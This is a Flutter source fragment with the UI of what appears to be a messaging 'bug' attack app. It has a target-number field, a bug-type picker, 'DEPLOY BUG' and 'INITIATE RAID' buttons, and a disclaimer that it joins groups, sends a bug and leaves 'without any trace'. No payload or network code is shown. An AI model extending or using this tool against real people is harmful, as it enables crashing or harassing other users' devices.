return Container(margin: const EdgeInsets.symmetric(vertical: 16, horizontal: 16), width: double.infinity, height: 62, decoration: BoxDecoration(borderRadius: BorderRadius.circular(20), boxShadow: [BoxShadow(color: accent.withOpacity(0.2), blurRadius: 25, spreadRadius: -5)]), child: ClipRRect(borderRadius: BorderRadius.circular(20), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 10, sigmaY: 10), child: AnimatedContainer(duration: const Duration(milliseconds: 300), decoration: BoxDecoration(gradient: LinearGradient(colors: [accent.withOpacity(0.15), accent.withOpacity(0.05)], begin: Alignment.topLeft, end: Alignment.bottomRight), borderRadius: BorderRadius.circular(20), border: Border.all(color: accent.withOpacity(0.4), width: 1.5)), child: ElevatedButton(onPressed: _isSending ? null : _sendBug, style: ElevatedButton.styleFrom(backgroundColor: Colors.transparent, shadowColor: Colors.transparent, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20))), child: _isSending ? SizedBox(height: 26, width: 26, child: CircularProgressIndicator(color: accent, strokeWidth: 3)) : Row(mainAxisAlignment: MainAxisAlignment.center, children: [
Icon(_isGroupMode ? Icons.groups : Icons.send, color: accent, size: 22),
const SizedBox(width: 12),
Text(_isGroupMode ? "INITIATE RAID" : "DEPLOY BUG", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16, letterSpacing: 2, fontFamily: cyberFont)),
]))))));
}

Widget _buildDisclaimer() {
  return ClipRRect(borderRadius: BorderRadius.circular(20), child: BackdropFilter(filter: ui.ImageFilter.blur(sigmaX: 10, sigmaY: 10), child: Container(margin: const EdgeInsets.symmetric(vertical: 10, horizontal: 16), padding: const EdgeInsets.all(18), decoration: BoxDecoration(color: glassWhite, borderRadius: BorderRadius.circular(20), border: Border.all(color: glassBorder, width: 1)), child: Row(children: [Icon(Icons.info_outline, color: Colors.white.withOpacity(0.3), size: 20), const SizedBox(width: 12), Expanded(child: Text(_isGroupMode ? "This tool will join the group, send a bug, and leave without any trace." : "Use responsibly. We are not responsible for misuse.", style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12, letterSpacing: 0.3)))]))));
}

@override
Widget build(BuildContext context) {
return Scaffold(backgroundColor: primaryDark, body: Stack(children: [
// Animated Background Mesh
AnimatedBuilder(animation: _bgMeshController, builder: (context, __) => Positioned.fill(child: CustomPaint(painter: _CyberMeshPainter(progress: _bgMeshController.value)))),

if (_isVideoInitialized) Positioned.fill(child: Opacity(opacity: 0.15, child: FittedBox(fit: BoxFit.cover, child: SizedBox(width: _videoController.value.size.width, height: _videoController.value.size.height, child: VideoPlayer(_videoController))))),  
  Positioned.fill(child: Container(decoration: BoxDecoration(gradient: LinearGradient(begin: Alignment.topCenter, end: Alignment.bottomCenter, colors: [primaryDark.withOpacity(0.8), primaryDark.withOpacity(0.4), primaryDark.withOpacity(0.9)])))),  
    
  SafeArea(child: SingleChildScrollView(padding: const EdgeInsets.symmetric(vertical: 12), physics: const BouncingScrollPhysics(), child: FadeTransition(opacity: _fadeAnimation, child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [  
    _buildVideoBanner(),  
    _buildModeSwitcher(),  
    _buildTargetNumberCard(),  
    _buildBugTypeCard(),  
    _buildStatusBoxes(),  
    _buildSendButton(),  
    _buildDisclaimer(),  
    const SizedBox(height: 30),  
  ])))),  
]));

}
}

// Cyberpunk Mesh Background Painter
class _CyberMeshPainter extends CustomPainter {
final double progress;
_CyberMeshPainter({required this.progress});

@override
void paint(Canvas canvas, Size size) {
final paint = Paint()..style = PaintingStyle.fill;

// Gradient 1: Cyan drift  
final rect1 = Rect.fromCircle(center: Offset(size.width * (0.3 + 0.1 * math.sin(progress * math.pi * 2)), size.height * (0.3 + 0.1 * math.cos(progress * math.pi * 2))), radius: size.width * 0.6);  
final gradient1 = RadialGradient(colors: [const Color(0xFF00F0FF).withOpacity(0.08), Colors.transparent]);  
paint.shader = gradient1.createShader(rect1);  
canvas.drawRect(Rect.largest, paint);  

// Gradient 2: Pink drift  
final rect2 = Rect.fromCircle(center: Offset(size.width * (0.7 + 0.1 * math.cos(progress * math.pi * 2)), size.height * (0.7 + 0.1 * math.sin(progress * math.pi * 2))), radius: size.width * 0.5);  
final gradient2 = RadialGradient(colors: [const Color(0xFFFF0055).withOpacity(0.06), Colors.transparent]);  
paint.shader = gradient2.createShader(rect2);  
canvas.drawRect(Rect.largest, paint);

}

@override
bool shouldRepaint(covariant CustomPainter oldDelegate) => true;
}
